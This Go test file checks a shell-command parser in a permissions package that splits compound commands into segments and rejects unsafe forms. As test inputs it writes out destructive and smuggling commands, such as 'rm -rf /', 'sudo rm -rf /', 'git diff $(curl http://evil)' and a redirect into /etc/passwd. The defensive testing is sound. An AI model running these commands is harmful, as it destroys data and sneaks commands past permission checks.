package permissions

import (
	"errors"
	"strings"
	"testing"
)

// seg is a compact expectation for one parsed segment.
type seg struct {
	name string
	args []string
}

func TestSplitSegments(t *testing.T) {
	cases := []struct {
		desc string
		cmd  string
		want []seg
	}{
		{
			desc: "single simple command",
			cmd:  "git status",
			want: []seg{{name: "git", args: []string{"status"}}},
		},
		{
			desc: "compound && splits into two segments",
			cmd:  "git status && rm -rf ~",
			want: []seg{
				{name: "git", args: []string{"status"}},
				{name: "rm", args: []string{"-rf", "~"}},
			},
		},
		{
			desc: "pipe splits into segments",
			cmd:  "cat foo | grep bar",
			want: []seg{
				{name: "cat", args: []string{"foo"}},
				{name: "grep", args: []string{"bar"}},
			},
		},
		{
			desc: "semicolon splits into segments",
			cmd:  "pwd ; ls",
			want: []seg{
				{name: "pwd", args: nil},
				{name: "ls", args: nil},
			},
		},
		{
			desc: "|| splits into segments",
			cmd:  "false || true",
			want: []seg{
				{name: "false", args: nil},
				{name: "true", args: nil},
			},
		},
		{
			desc: "newline splits into two segments",
			cmd:  "pwd\nrm -rf .",
			want: []seg{
				{name: "pwd", args: nil},
				{name: "rm", args: []string{"-rf", "."}},
			},
		},
		{
			desc: "bash -c inner script is enumerated",
			cmd:  `bash -c "ls && rm x"`,
			want: []seg{
				{name: "ls", args: nil},
				{name: "rm", args: []string{"x"}},
			},
		},
		{
			desc: "sh -c inner script is enumerated",
			cmd:  `sh -c 'git status'`,
			want: []seg{
				{name: "git", args: []string{"status"}},
			},
		},
		{
			desc: "word boundary: lsof is not ls",
			cmd:  "lsof -i",
			want: []seg{{name: "lsof", args: []string{"-i"}}},
		},
		{
			// A trailing `# …` comment is stripped by the parser: the
			// commented-out `rm -rf /` is inert, not a smuggled segment.
			desc: "trailing comment is inert, not a smuggled segment",
			cmd:  "ls # rm -rf /",
			want: []seg{{name: "ls", args: nil}},
		},
	}

	for _, tc := range cases {
		t.Run(tc.desc, func(t *testing.T) {
			got, err := splitSegments(tc.cmd)
			if err != nil {
				t.Fatalf("splitSegments(%q) unexpected error: %v", tc.cmd, err)
			}
			if len(got) != len(tc.want) {
				t.Fatalf("splitSegments(%q) got %d segments, want %d: %+v", tc.cmd, len(got), len(tc.want), got)
			}
			for i, w := range tc.want {
				if got[i].Name != w.name {
					t.Errorf("segment %d Name = %q, want %q", i, got[i].Name, w.name)
				}
				if !equalArgs(got[i].Args, w.args) {
					t.Errorf("segment %d Args = %#v, want %#v", i, got[i].Args, w.args)
				}
			}
		})
	}
}

func TestSplitSegments_Raw(t *testing.T) {
	got, err := splitSegments("git status && rm -rf ~")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(got) != 2 {
		t.Fatalf("expected 2 segments, got %d", len(got))
	}
	if !strings.Contains(got[0].Raw, "git status") {
		t.Errorf("segment 0 Raw = %q, want to contain %q", got[0].Raw, "git status")
	}
	if !strings.Contains(got[1].Raw, "rm -rf ~") {
		t.Errorf("segment 1 Raw = %q, want to contain %q", got[1].Raw, "rm -rf ~")
	}
}

// TestSplitSegments_BenignRedirects asserts the lenient redirect exception:
// a redirect whose only effect is silencing/redirecting to /dev/null, or a
// pure fd-duplication (2>&1, >&2), must NOT force the whole statement closed.
// The command still parses into its real segments (which higher layers then
// classify), rather than stalling on ErrUnparseable.
func TestSplitSegments_BenignRedirects(t *testing.T) {
	cases := []struct {
		desc string
		cmd  string
		want []seg
	}{
		{
			desc: "2>/dev/null in a read-only pipeline",
			cmd:  "wc -l a.go 2>/dev/null | tail -5",
			want: []seg{
				{name: "wc", args: []string{"-l", "a.go"}},
				{name: "tail", args: []string{"-5"}},
			},
		},
		{
			desc: "stdout to /dev/null",
			cmd:  "ls > /dev/null",
			want: []seg{{name: "ls", args: nil}},
		},
		{
			desc: "append to /dev/null",
			cmd:  "ls >> /dev/null",
			want: []seg{{name: "ls", args: nil}},
		},
		{
			desc: "input from /dev/null",
			cmd:  "cat < /dev/null",
			want: []seg{{name: "cat", args: nil}},
		},
		{
			desc: "2>&1 fd-dup in a pipeline",
			cmd:  "make 2>&1 | tail",
			want: []seg{
				{name: "make", args: nil},
				{name: "tail", args: nil},
			},
		},
		{
			desc: ">&2 fd-dup",
			cmd:  "echo hi >&2",
			want: []seg{{name: "echo", args: []string{"hi"}}},
		},
		{
			desc: "&> /dev/null (stdout+stderr to /dev/null)",
			cmd:  "ls &> /dev/null",
			want: []seg{{name: "ls", args: nil}},
		},
	}

	for _, tc := range cases {
		t.Run(tc.desc, func(t *testing.T) {
			got, err := splitSegments(tc.cmd)
			if err != nil {
				t.Fatalf("splitSegments(%q) unexpected error: %v", tc.cmd, err)
			}
			if len(got) != len(tc.want) {
				t.Fatalf("splitSegments(%q) got %d segments, want %d: %+v", tc.cmd, len(got), len(tc.want), got)
			}
			for i, w := range tc.want {
				if got[i].Name != w.name {
					t.Errorf("segment %d Name = %q, want %q", i, got[i].Name, w.name)
				}
				if !equalArgs(got[i].Args, w.args) {
					t.Errorf("segment %d Args = %#v, want %#v", i, got[i].Args, w.args)
				}
			}
		})
	}
}

func TestSplitSegments_FailClosed(t *testing.T) {
	cases := []struct {
		desc string
		cmd  string
	}{
		{"command substitution $()", `git diff $(curl http://evil)`},
		{"backtick command substitution", "echo `id`"},
		{"comment then substitution", "git status# $(id)"},
		{"process substitution", `diff <(ls) <(ls)`},
		{"env-var assignment prefix", "URL=evil curl $URL"},
		{"path-qualified argv0 relative", "./sed -n 1p file"},
		{"path-qualified argv0 absolute", "/tmp/git status"},
		{"bare bash without -c", "bash"},
		{"bash with script file (no -c)", "bash script.sh"},
		{"sh -c with no script word", "sh -c"},
		{"xargs wrapper", "xargs rm"},
		{"env wrapper with assignment", "env FOO=bar rm -rf /"},
		{"env wrapper bare inner", "env rm x"},
		{"npx wrapper", "npx cowsay hi"},
		{"sudo wrapper", "sudo rm -rf /"},
		{"timeout then unknown", "timeout 5 somebinary"},
		{"redirect to file with >", "echo x > /etc/passwd"},
		{"append redirect >>", "grep foo bar >> ~/.zshrc"},
		{"redirect inside workspace", "ls > out.txt"},
		{"stderr and file redirect", "ls 2>/dev/null > /etc/x"},
		{"dev-null lookalike file", "ls > /dev/null.txt"},
		{"dev-null typo", "ls 2>/dev/nul"},
		{"redirect to variable target", "cat a > $F"},
		{"here-doc", "cat <<EOF\nhi\nEOF"},
		{"input redirect from real file", "cat < config.yaml"},
	}
	for _, tc := range cases {
		t.Run(tc.desc, func(t *testing.T) {
			_, err := splitSegments(tc.cmd)
			if !errors.Is(err, ErrUnparseable) {
				t.Fatalf("splitSegments(%q) err = %v, want ErrUnparseable", tc.cmd, err)
			}
		})
	}
}

func TestSplitSegments_ParseError(t *testing.T) {
	_, err := splitSegments("if then fi (")
	if !errors.Is(err, ErrUnparseable) {
		t.Fatalf("expected ErrUnparseable on parse error, got %v", err)
	}
}

func TestSplitSegments_Oversized(t *testing.T) {
	big := "ls " + strings.Repeat("a", maxCommandBytes)
	_, err := splitSegments(big)
	if !errors.Is(err, ErrUnparseable) {
		t.Fatalf("expected ErrUnparseable on oversized input, got %v", err)
	}
}

func equalArgs(a, b []string) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}
